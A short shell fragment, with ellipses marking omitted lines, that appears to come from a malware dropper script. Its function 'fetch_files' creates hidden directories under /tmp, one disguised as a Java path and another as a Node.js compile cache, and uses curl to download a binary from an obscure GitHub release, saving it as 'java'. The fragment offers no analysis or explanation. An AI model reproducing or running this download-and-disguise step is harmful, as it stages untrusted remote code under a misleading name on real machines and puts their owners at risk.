...
function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b,.c}  /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/{etc,log}
    ...
    cd /tmp/.java/bin/.c && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/cntr-restart -o java
}
